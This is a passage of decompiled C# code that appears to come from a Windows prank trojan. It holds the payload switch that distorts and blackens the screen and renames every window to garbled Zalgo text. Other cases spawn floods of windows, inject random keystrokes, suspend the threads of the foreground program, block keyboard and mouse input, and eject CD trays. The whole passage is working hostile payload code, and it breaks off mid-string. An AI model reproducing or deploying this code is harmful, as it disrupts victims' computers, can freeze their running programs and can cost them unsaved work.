					val12.DrawImage((Image)(object)val13, new Rectangle(0, 0, ((Image)val13).get_Width(), ((Image)val13).get_Height()), 0, 0, ((Image)val13).get_Width(), ((Image)val13).get_Height(), (GraphicsUnit)2, val14);
				}
				finally
				{
					((IDisposable)val12)?.Dispose();
				}
				ReleaseDC(IntPtr.Zero, dC);
				break;
			}
			case 26:
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Graphics val10 = Graphics.FromHdc(dC);
				try
				{
					Bitmap val11 = new Bitmap(w1, h1);
					Graphics obj4 = Graphics.FromImage((Image)(object)val11);
					obj4.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(w1, h1));
					obj4.Dispose();
					val10.RotateTransform((float)(r.NextDouble() * 150.0));
					val10.DrawImage((Image)(object)val11, new Rectangle(0, 0, ((Image)val11).get_Width(), ((Image)val11).get_Height()), 0, 0, ((Image)val11).get_Width(), ((Image)val11).get_Height(), (GraphicsUnit)2);
				}
				finally
				{
					((IDisposable)val10)?.Dispose();
				}
				ReleaseDC(IntPtr.Zero, dC);
				break;
			}
			case 27:
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Graphics val8 = Graphics.FromHdc(dC);
				try
				{
					Bitmap val9 = new Bitmap(w1, h1);
					Graphics obj3 = Graphics.FromImage((Image)(object)val9);
					obj3.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(w1, h1));
					obj3.Dispose();
					val8.ScaleTransform((float)(r.NextDouble() * 6.0 - 3.0), (float)(r.NextDouble() * 6.0 - 3.0));
					val8.DrawImage((Image)(object)val9, new Rectangle(0, 0, ((Image)val9).get_Width(), ((Image)val9).get_Height()), 0, 0, ((Image)val9).get_Width(), ((Image)val9).get_Height(), (GraphicsUnit)2);
				}
				finally
				{
					((IDisposable)val8)?.Dispose();
				}
				ReleaseDC(IntPtr.Zero, dC);
				break;
			}
			case 28:
				mouseEff3 = true;
				break;
			case 29:
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Graphics val6 = Graphics.FromHdc(dC);
				try
				{
					Bitmap val7 = new Bitmap(w1, h1);
					Graphics obj2 = Graphics.FromImage((Image)(object)val7);
					obj2.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(w1, h1));
					obj2.Dispose();
					val6.ScaleTransform(-1f, 1f);
					val6.DrawImage((Image)(object)val7, new Rectangle(0, 0, ((Image)val7).get_Width(), ((Image)val7).get_Height()), 0, 0, ((Image)val7).get_Width(), ((Image)val7).get_Height(), (GraphicsUnit)2);
				}
				finally
				{
					((IDisposable)val6)?.Dispose();
				}
				ReleaseDC(IntPtr.Zero, dC);
				break;
			}
			case 30:
				((Control)new Form7()).Show();
				break;
			case 31:
				((Control)new Form8()).Show();
				break;
			case 32:
			{
				for (int num6 = 0; num6 < r.Next(30, 60); num6++)
				{
					((Control)new Form9()).Show();
					Thread.Sleep(20);
				}
				break;
			}
			case 33:
				PlayBeep(1000, 100, 16383, loop: false);
				break;
			case 34:
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Graphics val4 = Graphics.FromHdc(dC);
				try
				{
					for (int n = 0; n < 60; n++)
					{
						Icon val5 = null;
						switch (r.Next(6))
						{
						case 0:
							val5 = SystemIcons.get_Application();
							break;
						case 1:
							val5 = SystemIcons.get_WinLogo();
							break;
						case 2:
							val5 = SystemIcons.get_Hand();
							break;
						case 3:
							val5 = SystemIcons.get_Warning();
							break;
						case 4:
							val5 = SystemIcons.get_Question();
							break;
						case 5:
							val5 = SystemIcons.get_Information();
							break;
						}
						val4.DrawIcon(val5, r.Next(0, w1), r.Next(0, h1));
					}
				}
				finally
				{
					((IDisposable)val4)?.Dispose();
				}
				ReleaseDC(IntPtr.Zero, dC);
				break;
			}
			case 35:
			{
				Desktop.SaveDesktop();
				int num5 = Desktop.m_OriginalPoint.Length;
				IntPtr sysLVHwnd = Desktop.GetSysLVHwnd();
				for (int m = 0; m < num5; m++)
				{
					Desktop.SendMessageA_1(sysLVHwnd, 4111, m, MakeLParam(r.Next(0, w1), r.Next(0, h1)));
				}
				break;
			}
			case 36:
				wtfEff1 = true;
				break;
			case 37:
				wtfEff2 = true;
				break;
			case 38:
				wtfEff3 = true;
				break;
			case 39:
				Desktop.EnumWindows(delegate(IntPtr hwnd, IntPtr lParam)
				{
					foreach (IntPtr allChildrenWindowHandle in GetAllChildrenWindowHandles(hwnd, int.MaxValue))
					{
						try
						{
							SendMessage(allChildrenWindowHandle, 12u, IntPtr.Zero, ".\u0310\u0305\u030b\u0309\u034c\u0311\u0313\u0305\u0307\u0366\u033e\u0305\u0312\u0301\u0312\u0361\u0315\u0349\u0348\u0332\u031d\u0356\u0320\u032e\u0349\u0332\u0345\u0354.\u036a\u033e\u034c\u0311\u0358\u033c\u0359\u033b\u0324\u033c\u0325\u0325\u0324\u0318.\u0313\u030f\u0343\u0306\u0311\u0357\u0310\u0351\u0301\u0350\u0352\u0313\u0351\u030a\u0337\u0328\u0360\u0316\u034d\u032f\u032e\u0320\u0324\u0325\u0324\u032d\u0354\u0359\u0331\u0359\u032c\u0345\u032e\u031e.\u035b\u036e\u0306\u036f\u036c\u0357\u030d\u0342\u0304\u034b\u0305\u033f\u0350\u0343\u030d\u0363\u030f\u035c\u035f\u035f\u0362\u033b\u0339\u0339\u0318\u0339\u031f\u0319\u033a.\u0367\u0300\u030f\u033d\u036b\u0369\u034b\u0303\u0344\u0352\u0311\u0364\u0311\u0352\u033d\u031a\u0335\u0316\u0329\u0347\u034e\u0318.\u036f\u030b\u030a\u0310\u034a\u033d\u0313\u0309\u0307\u031a\u0342\u0366\u0358\u0358\u0358\u0340\u031e\u034d\u032e\u0331\u033c\u031c\u034e\u034e.\u0343\u0342\u0302\u0346\u0306\u036c\u0315\u0321\u0353\u032f\u0349\u033c\u0333\u0316\u032f\u031f\u0332\u034e\u0332.\u0304\u030a\u0313\u031a\u0366\u033f\u035c\u0322\u0348\u0329\u033a\u033c\u032a\u0345\u031f\u0324\u0333\u031c\u031d\u035a\u0333\u0345.\u0313\u036d\u033f\u036c\u030f\u0352\u0303\u030e\u0301\u0360\u035f\u0338\u0361\u035d\u0316\u0354\u0324\u0320\u0333\u0317\u0319\u031f\u0323\u035a.\u034a\u035b\u0367\u0305\u0302\u034c\u0307\u030a\u036f\u0334\u0358\u0334\u035e\u032c\u0332\u0355\u0324\u0323\u033c\u0323\u032e\u032b\u032e\u032e\u0319\u035a.\u030f\u036c\u0365\u0309\u0304\u0351\u030d\u0357\u0302\u0367\u033f\u0352\u0362\u0336\u0328\u0336\u0339\u031e\u032a\u033c.\u0306\u0306\u0310\u030b\u0342\u0346\u0310\u0300\u034c\u0369\u0368\u036f\u0302\u0363\u0308\u033e\u0336\u0328\u0324\u0319\u0317\u0353\u035a\u0331\u0345\u0319\u0332\u0317\u0348\u033b\u0339.\u0305\u036c\u035b\u030d\u033d\u0343\u034b\u0367\u035b\u030a\u0314\u030a\u030e\u0358\u034f\u0341\u0338\u0360\u033c\u0318\u032c\u032a\u0348\u0345\u0349\u0320\u0347\u0354\u0316\u0359.\u0363\u0367\u030a\u033f\u031a\u0364\u0305\u033f\u0343\u0304\u030d\u0365\u036a\u036a\u0301\u030f\u0357\u0368\u0364\u0322\u0340\u0327\u031d\u031f\u0353\u031d\u0318\u031e\u032c\u0320\u0348\u035a\u032d\u0354\u031d\u033a\u0329\u0316\u0326\u031d.\u0342\u036e\u0303\u0363\u035b\u0314\u0365\u0368\u0309\u033e\u0344\u0335\u0349\u034d\u032a\u0348\u0355\u0347\u0326\u0329.\u0309\u0300\u030c\u036d\u0313\u036c\u0310\u0305\u0306\u0301\u0311\u036b\u0305\u0340\u031b\u034d\u0333\u0319\u0324\u0349\u0333\u032c\u0348\u0329\u0339\u033c\u0318\u031d\u032a\u0355\u0316.\u0312\u0352\u030c\u0309\u0489\u0325\u0320\u033b\u032e\u0323\u0356\u032f\u0324.\u0313\u0305\u036c\u0304\u0303\u0305\u030e\u031a\u030f\u035c\u0361\u035e\u0337\u0358\u0356\u031c\u033a\u0332\u0319\u0349\u0347\u0318\u033a\u0333\u033b\u0348\u0354.\u0363\u033d\u0304\u0351\u0310\u0314\u0301\u036f\u0300\u0301\u0352\u034a\u034c\u036a\u0489\u0322\u0322\u032a\u0333\u031c\u0356\u032b\u0348\u0353.\u034a\u0351\u0343\u034a\u036c\u0367\u0342\u0313\u0343\u0367\u030a\u033e\u0312\u033d\u036d\u036a\u0336\u035a\u0323\u032b\u031f\u0356\u0317\u0355\u0356\u0345\u034e\u033c\u032e\u0330\u0332\u0316\u034d\u0356\u033b\u0345.\u034a\u0311\u0301\u0365\u0315\u0361\u035f\u0362\u0328\u0326\u0317\u0316\u0331\u034e\u033a\u034e\u0325\u032c\u032f\u033a\u035a\u032a.\u0367\u0307\u0312\u034c\u0342\u036a\u030a\u0357\u0313\u0314\u035e\u0324\u0317\u0317\u032f\u034e\u0329\u0323\u0319\u032b\u0356\u033a.\u0313\u030b\u0305\u0303\u0346\u030f\u036c\u033d\u035e\u0489\u0340\u034f\u0325\u033a\u035a\u0329\u031c\u0348\u0331\u0320.\u036a\u036c\u0302\u036e\u0311\u0351\u0309\u0342\u030d\u030b\u0351\u0309\u0334\u0327\u0316\u0354\u032e\u031d\u0349\u033a\u0332\u0324\u032c\u0339\u034d\u032d\u0319\u0330.\u0343\u0308\u0303\u0364\u034b\u030c\u0309\u0357\u0327\u0358\u0360\u0341\u0327\u0330\u0316\u0345\u031d\u0333\u0356\u0331\u0325\u0348\u0333.\u0350\u0301\u0307\u035b\u0351\u0366\u036b\u0314\u0306\u0313\u0369\u030c\u0336\u0321\u0328\u0330\u032e\u031d\u0320\u0323\u032e\u0317\u032c\u033a\u0349\u0318\u033b\u033c\u033b\u0331\u031e\u0353\u032a.\u035b\u036e\u0314\u031a\u0328\u0328\u032f\u031f\u0354\u0339\u033a\u031d\u0331\u0316\u0329\u031c\u0339\u032e.\u0307\u0310\u0363\u033d\u0303\u0369\u034f\u031b\u0362\u0332\u0347\u031f\u032c\u032a\u0339\u032f\u0331\u0317.\u0357\u034c\u035b\u0367\u033d\u0311\u036e\u0364\u0310\u0322\u035d\u0362\u0325\u031c\u031d\u033c\u031c\u034e\u032a\u0326\u032f\u034e\u0323\u0345\u0325\u032d\u0348\u0347\u0326\u0347.\u0344\u0357\u036a\u033f\u030a\u036f\u0314\u034a\u0357\u0363\u0350\u0309\u0310\u0350\u034b\u036e\u0334\u0327\u035c\u0336\u0360\u0359\u032e\u031e\u0317\u0345\u0356\u032b\u0355\u0320\u034d\u0320\u0356\u0316\u031c\u0349\u031c.\u0350\u035b\u0357\u0313\u034a\u0365\u0307\u031a\u0344\u036a\u030b\u033f\u0346\u030f\u0366\u0306\u0312\u0344\u0307\u0337\u0489\u031b\u035d\u0361\u032c\u0332\u0348\u0325\u0347\u0349\u0349\u0319\u0353\u0316\u032c\u031e\u033c\u032a\u034d\u0330\u0317.\u0309\u0300\u0310\u036c\u0308\u036d\u0305\u0489\u035c\u033c\u0323\u032b\u031c\u032b\u031d\u032f\u0347\u0349\u0330\u031f\u032b\u0353\u0329\u0319\u0348.\u0307\u033f\u0365\u035b\u0352\u036c\u034a\u0313\u036b\u036b\u035b\u0328\u0360\u034f\u033a\u0325\u035a\u033b\u032a\u033a\u032e\u033a\u0345\u0325\u031c\u031c\u0349\u0325\u0348\u034d.\u0300\u033d\u033d\u0357\u0352\u0346\u030a\u035b\u033f\u0301\u0308\u0343\u0311\u0300\u036c\u030e\u0362\u0338\u0333\u0326\u035a\u031c\u0318\u032c\u031c\u034e\u032f\u0320\u0324\u0329.\u0309\u034a\u033f\u0309\u0344\u031a\u0369\u0350\u0343\u0340\u0322\u0353\u035a\u0316\u0326\u0355.\u034a\u036a\u036c\u031a\u0312\u030b\u0310\u034a\u0363\u031a\u036a\u034a\u0311\u030e\u0365\u036d\u0357\u035c\u035d\u0340\u0337\u0326\u0355\u0355\u0347\u031d\u032e\u0347\u0317\u0349\u031c\u0329.\u034a\u0309\u0309\u0304\u036d\u030a\u0365\u0305\u034a\u0309\u0363\u0307\u0310\u0327\u034f\u0348\u0349\u0355\u0333\u0353\u031c\u0354\u0316\u0347\u034d\u032e.\u030d\u0303\u033e\u030e\u0309\u030f\u0322\u0321\u0338\u0489\u031b\u0320\u032b\u031e\u0316\u0326");
							Desktop.SendMessageA(allChildrenWindowHandle, 20, 0, 0);
							checkMenu(allChildrenWindowHandle);
						}
						catch (Exception)
						{
						}
					}
					try
					{
						SendMessage(hwnd, 12u, IntPtr.Zero, ".\u0310\u0305\u030b\u0309\u034c\u0311\u0313\u0305\u0307\u0366\u033e\u0305\u0312\u0301\u0312\u0361\u0315\u0349\u0348\u0332\u031d\u0356\u0320\u032e\u0349\u0332\u0345\u0354.\u036a\u033e\u034c\u0311\u0358\u033c\u0359\u033b\u0324\u033c\u0325\u0325\u0324\u0318.\u0313\u030f\u0343\u0306\u0311\u0357\u0310\u0351\u0301\u0350\u0352\u0313\u0351\u030a\u0337\u0328\u0360\u0316\u034d\u032f\u032e\u0320\u0324\u0325\u0324\u032d\u0354\u0359\u0331\u0359\u032c\u0345\u032e\u031e.\u035b\u036e\u0306\u036f\u036c\u0357\u030d\u0342\u0304\u034b\u0305\u033f\u0350\u0343\u030d\u0363\u030f\u035c\u035f\u035f\u0362\u033b\u0339\u0339\u0318\u0339\u031f\u0319\u033a.\u0367\u0300\u030f\u033d\u036b\u0369\u034b\u0303\u0344\u0352\u0311\u0364\u0311\u0352\u033d\u031a\u0335\u0316\u0329\u0347\u034e\u0318.\u036f\u030b\u030a\u0310\u034a\u033d\u0313\u0309\u0307\u031a\u0342\u0366\u0358\u0358\u0358\u0340\u031e\u034d\u032e\u0331\u033c\u031c\u034e\u034e.\u0343\u0342\u0302\u0346\u0306\u036c\u0315\u0321\u0353\u032f\u0349\u033c\u0333\u0316\u032f\u031f\u0332\u034e\u0332.\u0304\u030a\u0313\u031a\u0366\u033f\u035c\u0322\u0348\u0329\u033a\u033c\u032a\u0345\u031f\u0324\u0333\u031c\u031d\u035a\u0333\u0345.\u0313\u036d\u033f\u036c\u030f\u0352\u0303\u030e\u0301\u0360\u035f\u0338\u0361\u035d\u0316\u0354\u0324\u0320\u0333\u0317\u0319\u031f\u0323\u035a.\u034a\u035b\u0367\u0305\u0302\u034c\u0307\u030a\u036f\u0334\u0358\u0334\u035e\u032c\u0332\u0355\u0324\u0323\u033c\u0323\u032e\u032b\u032e\u032e\u0319\u035a.\u030f\u036c\u0365\u0309\u0304\u0351\u030d\u0357\u0302\u0367\u033f\u0352\u0362\u0336\u0328\u0336\u0339\u031e\u032a\u033c.\u0306\u0306\u0310\u030b\u0342\u0346\u0310\u0300\u034c\u0369\u0368\u036f\u0302\u0363\u0308\u033e\u0336\u0328\u0324\u0319\u0317\u0353\u035a\u0331\u0345\u0319\u0332\u0317\u0348\u033b\u0339.\u0305\u036c\u035b\u030d\u033d\u0343\u034b\u0367\u035b\u030a\u0314\u030a\u030e\u0358\u034f\u0341\u0338\u0360\u033c\u0318\u032c\u032a\u0348\u0345\u0349\u0320\u0347\u0354\u0316\u0359.\u0363\u0367\u030a\u033f\u031a\u0364\u0305\u033f\u0343\u0304\u030d\u0365\u036a\u036a\u0301\u030f\u0357\u0368\u0364\u0322\u0340\u0327\u031d\u031f\u0353\u031d\u0318\u031e\u032c\u0320\u0348\u035a\u032d\u0354\u031d\u033a\u0329\u0316\u0326\u031d.\u0342\u036e\u0303\u0363\u035b\u0314\u0365\u0368\u0309\u033e\u0344\u0335\u0349\u034d\u032a\u0348\u0355\u0347\u0326\u0329.\u0309\u0300\u030c\u036d\u0313\u036c\u0310\u0305\u0306\u0301\u0311\u036b\u0305\u0340\u031b\u034d\u0333\u0319\u0324\u0349\u0333\u032c\u0348\u0329\u0339\u033c\u0318\u031d\u032a\u0355\u0316.\u0312\u0352\u030c\u0309\u0489\u0325\u0320\u033b\u032e\u0323\u0356\u032f\u0324.\u0313\u0305\u036c\u0304\u0303\u0305\u030e\u031a\u030f\u035c\u0361\u035e\u0337\u0358\u0356\u031c\u033a\u0332\u0319\u0349\u0347\u0318\u033a\u0333\u033b\u0348\u0354.\u0363\u033d\u0304\u0351\u0310\u0314\u0301\u036f\u0300\u0301\u0352\u034a\u034c\u036a\u0489\u0322\u0322\u032a\u0333\u031c\u0356\u032b\u0348\u0353.\u034a\u0351\u0343\u034a\u036c\u0367\u0342\u0313\u0343\u0367\u030a\u033e\u0312\u033d\u036d\u036a\u0336\u035a\u0323\u032b\u031f\u0356\u0317\u0355\u0356\u0345\u034e\u033c\u032e\u0330\u0332\u0316\u034d\u0356\u033b\u0345.\u034a\u0311\u0301\u0365\u0315\u0361\u035f\u0362\u0328\u0326\u0317\u0316\u0331\u034e\u033a\u034e\u0325\u032c\u032f\u033a\u035a\u032a.\u0367\u0307\u0312\u034c\u0342\u036a\u030a\u0357\u0313\u0314\u035e\u0324\u0317\u0317\u032f\u034e\u0329\u0323\u0319\u032b\u0356\u033a.\u0313\u030b\u0305\u0303\u0346\u030f\u036c\u033d\u035e\u0489\u0340\u034f\u0325\u033a\u035a\u0329\u031c\u0348\u0331\u0320.\u036a\u036c\u0302\u036e\u0311\u0351\u0309\u0342\u030d\u030b\u0351\u0309\u0334\u0327\u0316\u0354\u032e\u031d\u0349\u033a\u0332\u0324\u032c\u0339\u034d\u032d\u0319\u0330.\u0343\u0308\u0303\u0364\u034b\u030c\u0309\u0357\u0327\u0358\u0360\u0341\u0327\u0330\u0316\u0345\u031d\u0333\u0356\u0331\u0325\u0348\u0333.\u0350\u0301\u0307\u035b\u0351\u0366\u036b\u0314\u0306\u0313\u0369\u030c\u0336\u0321\u0328\u0330\u032e\u031d\u0320\u0323\u032e\u0317\u032c\u033a\u0349\u0318\u033b\u033c\u033b\u0331\u031e\u0353\u032a.\u035b\u036e\u0314\u031a\u0328\u0328\u032f\u031f\u0354\u0339\u033a\u031d\u0331\u0316\u0329\u031c\u0339\u032e.\u0307\u0310\u0363\u033d\u0303\u0369\u034f\u031b\u0362\u0332\u0347\u031f\u032c\u032a\u0339\u032f\u0331\u0317.\u0357\u034c\u035b\u0367\u033d\u0311\u036e\u0364\u0310\u0322\u035d\u0362\u0325\u031c\u031d\u033c\u031c\u034e\u032a\u0326\u032f\u034e\u0323\u0345\u0325\u032d\u0348\u0347\u0326\u0347.\u0344\u0357\u036a\u033f\u030a\u036f\u0314\u034a\u0357\u0363\u0350\u0309\u0310\u0350\u034b\u036e\u0334\u0327\u035c\u0336\u0360\u0359\u032e\u031e\u0317\u0345\u0356\u032b\u0355\u0320\u034d\u0320\u0356\u0316\u031c\u0349\u031c.\u0350\u035b\u0357\u0313\u034a\u0365\u0307\u031a\u0344\u036a\u030b\u033f\u0346\u030f\u0366\u0306\u0312\u0344\u0307\u0337\u0489\u031b\u035d\u0361\u032c\u0332\u0348\u0325\u0347\u0349\u0349\u0319\u0353\u0316\u032c\u031e\u033c\u032a\u034d\u0330\u0317.\u0309\u0300\u0310\u036c\u0308\u036d\u0305\u0489\u035c\u033c\u0323\u032b\u031c\u032b\u031d\u032f\u0347\u0349\u0330\u031f\u032b\u0353\u0329\u0319\u0348.\u0307\u033f\u0365\u035b\u0352\u036c\u034a\u0313\u036b\u036b\u035b\u0328\u0360\u034f\u033a\u0325\u035a\u033b\u032a\u033a\u032e\u033a\u0345\u0325\u031c\u031c\u0349\u0325\u0348\u034d.\u0300\u033d\u033d\u0357\u0352\u0346\u030a\u035b\u033f\u0301\u0308\u0343\u0311\u0300\u036c\u030e\u0362\u0338\u0333\u0326\u035a\u031c\u0318\u032c\u031c\u034e\u032f\u0320\u0324\u0329.\u0309\u034a\u033f\u0309\u0344\u031a\u0369\u0350\u0343\u0340\u0322\u0353\u035a\u0316\u0326\u0355.\u034a\u036a\u036c\u031a\u0312\u030b\u0310\u034a\u0363\u031a\u036a\u034a\u0311\u030e\u0365\u036d\u0357\u035c\u035d\u0340\u0337\u0326\u0355\u0355\u0347\u031d\u032e\u0347\u0317\u0349\u031c\u0329.\u034a\u0309\u0309\u0304\u036d\u030a\u0365\u0305\u034a\u0309\u0363\u0307\u0310\u0327\u034f\u0348\u0349\u0355\u0333\u0353\u031c\u0354\u0316\u0347\u034d\u032e.\u030d\u0303\u033e\u030e\u0309\u030f\u0322\u0321\u0338\u0489\u031b\u0320\u032b\u031e\u0316\u0326");
						Desktop.SendMessageA(hwnd, 20, 0, 0);
						checkMenu(hwnd);
					}
					catch (Exception)
					{
					}
					return true;
				}, IntPtr.Zero);
				break;
			case 40:
			{
				string t__ = "";
				for (int l = 0; l < r.Next(1, 8); l++)
				{
					t__ += randToken();
				}
				try
				{
					SendKeys.Send(t__);
					break;
				}
				catch (Exception)
				{
					new Thread((ThreadStart)delegate
					{
						SendKeys.SendWait(t__);
					}).Start();
					break;
				}
			}
			case 41:
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Graphics val2 = Graphics.FromHdc(dC);
				try
				{
					for (int k = 0; k < 20; k++)
					{
						int num = r.Next(0, w1);
						int num2 = r.Next(0, h1);
						int x = r.Next(0, w1);
						int y = r.Next(0, h1);
						int num3 = r.Next(0, w1);
						int num4 = r.Next(0, h1);
						if (num + num3 >= w1)
						{
							num3 = w1 - num - 1;
						}
						if (num2 + num4 >= num2)
						{
							num4 = h1 - num2 - 1;
						}
						Bitmap val3 = new Bitmap(num3, num4);
						Graphics obj = Graphics.FromImage((Image)(object)val3);
						obj.CopyFromScreen(new Point(num, num2), new Point(0, 0), new Size(num3, num4));
						obj.Dispose();
						val2.ScaleTransform(-1f, 1f);
						val2.DrawImage((Image)(object)val3, new Rectangle(x, y, ((Image)val3).get_Width(), ((Image)val3).get_Height()), 0, 0, ((Image)val3).get_Width(), ((Image)val3).get_Height(), (GraphicsUnit)2);
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				ReleaseDC(IntPtr.Zero, dC);
				break;
			}
			case 42:
				wtfEff4 = true;
				break;
			case 43:
			{
				uint ProcessId = 0u;
				GetWindowThreadProcessId(GetForegroundWindow(), out ProcessId);
				{
					foreach (ProcessThread thread in Process.GetProcessById((int)ProcessId).Threads)
					{
						IntPtr hThread = OpenThread(3u, bInheritHandle: false, Convert.ToUInt32(thread.Id));
						try
						{
							for (int j = 1; j <= 30; j++)
							{
								try
								{
									SuspendThread(hThread);
								}
								catch (Exception)
								{
								}
							}
						}
						catch (Exception)
						{
						}
					}
					break;
				}
			}
			case 44:
				BlockInput(fBlockIt: true);
				new Thread((ThreadStart)delegate
				{
					Thread.Sleep(r.Next(500, 5000));
					BlockInput(fBlockIt: false);
				}).Start();
				break;
			case 45:
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					if (driveInfo.DriveType == DriveType.CDRom)
					{
						string text = driveInfo.Name.Substring(0, 1);
						mciSendString("open " + text + ": type CDaudio alias drive" + text, IntPtr.Zero, 0, 0);
						mciSendString("set drive" + text + " door open", IntPtr.Zero, 0, 0);
					}
				}
				break;
			}
			case 46:
				keybd_event(144, 69, 1u, (UIntPtr)0uL);
				keybd_event(144, 69, 3u, (UIntPtr)0uL);
				break;
			case 47:
				keybd_event(20, 69, 1u, (UIntPtr)0uL);
				keybd_event(20, 69, 3u, (UIntPtr)0uL);
				break;
			case 48:
				keybd_event(145, 69, 1u, (UIntPtr)0uL);
				keybd_event(145, 69, 3u, (UIntPtr)0uL);
				break;
			case 49:
			{
				foreach (IntPtr window3 in GetWindows())
				{
					try
					{
						ShowWindowAsync(window3, 1);
					}
					catch (Exception)
					{
					}
				}
				break;
			}
			case 50:
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Graphics val = Graphics.FromHdc(dC);
				try
				{
					val.Clear(Color.Black);
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
				ReleaseDC(IntPtr.Zero, dC);
				break;
			}
			case 51:
				wtfEff5 = true;
				break;
			case 18:
				break;
			}
		}
		catch (Exception ex8)
		{
			if (Program.debugmode)
			{
				MessageBox.Show(ex8.ToString());
			}
		}
	}

	[DllImport("user32.dll")]
	private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool fBlockIt);

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

	[DllImport("winmm.dll")]
	public static extern int mciSendString(string lpstrCommand, IntPtr lpstrReturnString, int uReturnLength, int hwndCallback);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern int SuspendThread(IntPtr hThread);

	private string randToken()
	{
		int num = r.Next(specs.Length + 62);
		if (num < specs.Length)
		{
			return specs[num];
		}
		return char.ToString(specc[num - specs.Length]);
	}

	[DllImport("user32.dll")]
	private static extern bool IsMenu(IntPtr hMenu);

	[DllImport("user32.dll")]
	private static extern int GetMenuItemCount(IntPtr hMenu);

	private void checkMenu(IntPtr hWnd)
	{
		IntPtr hMenu = (IntPtr)Desktop.SendMessageA(hWnd, 481, 0, 0);
		if (!IsMenu(hMenu))
		{
			return;
		}
		int menuItemCount = GetMenuItemCount(hMenu);
		for (uint num = 0u; num < menuItemCount; num++)
		{
			MENUITEMINFO lpmii = new MENUITEMINFO();
			lpmii.fMask = 64u;
			lpmii.fType = 0u;
			lpmii.dwTypeData = IntPtr.Zero;
			if (!GetMenuItemInfo(hMenu, num, fByPosition: true, out lpmii))
			{
				break;
			}
			lpmii.cch++;
			lpmii.dwTypeData = Marshal.AllocHGlobal((IntPtr)(lpmii.cch * 2));
			try
			{
				if (!GetMenuItemInfo(hMenu, num, fByPosition: true, out lpmii))
				{
					break;
				}
				Marshal.PtrToStringUni(lpmii.dwTypeData);
				string text = fit(".\u0310\u0305\u030b\u0309\u034c\u0311\u0313\u0305\u0307\u0366\u033e\u0305\u0312\u0301\u0312\u0361\u0315\u0349\u0348\u0332\u031d\u0356\u0320\u032e\u0349\u0332\u0345\u0354.\u036a\u033e\u034c\u0311\u0358\u033c\u0359\u033b\u0324\u033c\u0325\u0325\u0324\u0318.\u0313\u030f\u0343\u0306\u0311\u0357\u0310\u0351\u0301\u0350\u0352\u0313\u0351\u030a\u0337\u0328\u0360\u0316\u034d\u032f\u032e\u0320\u0324\u0325\u0324\u032d\u0354\u0359\u0331\u0359\u032c\u0345\u032e\u031e.\u035b\u036e\u0306\u036f\u036c\u0357\u030d\u0342\u0304\u034b\u0305\u033f\u0350\u0343\u030d\u0363\u030f\u035c\u035f\u035f\u0362\u033b\u0339\u0339\u0318\u0339\u031f\u0319\u033a.\u0367\u0300\u030f\u033d\u036b\u0369\u034b\u0303\u0344\u0352\u0311\u0364\u0311\u0352\u033d\u031a\u0335\u0316\u0329\u0347\u034e\u0318.\u036f\u030b\u030a\u0310\u034a\u033d\u0313\u0309\u0307\u031a\u0342\u0366\u0358\u0358\u0358\u0340\u031e\u034d\u032e\u0331\u033c\u031c\u034e\u034e.\u0343\u0342\u0302\u0346\u0306\u036c\u0315\u0321\u0353\u032f\u0349\u033c\u0333\u0316\u032f\u031f\u0332\u034e\u0332.\u0304\u030a\u0313\u031a\u0366\u033f\u035c\u0322\u0348\u0329\u033a\u033c\u032a\u0345\u031f\u0324\u0333\u031c\u031d\u035a\u0333\u0345.\u0313\u036d\u033f\u036c\u030f\u0352\u0303\u030e\u0301\u0360\u035f\u0338\u0361\u035d\u0316\u0354\u0324\u0320\u0333\u0317\u0319\u031f\u0323\u035a.\u034a\u035b\u0367\u0305\u0302\u034c\u0307\u030a\u036f\u0334\u0358\u0334\u035e\u032c\u0332\u0355\u0324\u0323\u033c\u0323\u032e\u032b\u032e\u032e\u0319\u035a.\u030f\u036c\u0365\u0309\u0304\u0351\u030d\u0357\u0302\u0367\u033f\u0352\u0362\u0336\u0328\u0336\u0339\u031e\u032a\u033c.\u0306\u0306\u0310\u030b\u0342\u0346\u0310\u0300\u034c\u0369\u0368\u036f\u0302\u0363\u0308\u033e\u0336\u0328\u0324\u0319\u0317\u0353\u035a\u0331\u0345\u0319\u0332\u0317\u0348\u033b\u0339.\u0305\u036c\u035b\u030d\u033d\u0343\u034b\u0367\u035b\u030a\u0314\u030a\u030e\u0358\u034f\u0341\u0338\u0360\u033c\u0318\u032c\u032a\u0348\u0345\u0349\u0320\u0347\u0354\u0316\u0359.\u0363\u0367\u030a\u033f\u031a\u0364\u0305\u033f\u0343\u0304\u030d\u0365\u036a\u036a\u0301\u030f\u0357\u0368\u0364\u0322\u0340\u0327\u031d\u031f\u0353\u031d\u0318\u031e\u032c\u0320\u0348\u035a\u032d\u0354\u031d\u033a\u0329\u0316\u0326\u031d.\u0342\u036e\u0303\u0363\u035b\u0314\u0365\u0368\u0309\u033e\u0344\u0335\u0349\u034d\u032a\u0348\u0355\u0347\u0326\u0329.\u0309\u0300\u030c\u036d\u0313\u036c\u0310\u0305\u0306\u0301\u0311\u036b\u0305\u0340\u031b\u034d\u0333\u0319\u0324\u0349\u0333\u032c\u0348\u0329\u0339\u033c\u0318\u031d\u032a\u0355\u0316.\u0312\u0352\u030c\u0309\u0489\u0325\u0320\u033b\u032e\u0323\u0356\u032f\u0324.\u0313\u0305\u036c\u0304\u0303\u0305\u030e\u031a\u030f\u035c\u0361\u035e\u0337\u0358\u0356\u031c\u033a\u0332\u0319\u0349\u0347\u0318\u033a\u0333\u033b\u0348\u0354.\u0363\u033d\u0304\u0351\u0310\u0314\u0301\u036f\u0300\u0301\u0352\u034a\u034c\u036a\u0489\u0322\u0322\u032a\u0333\u031c\u0356\u032b\u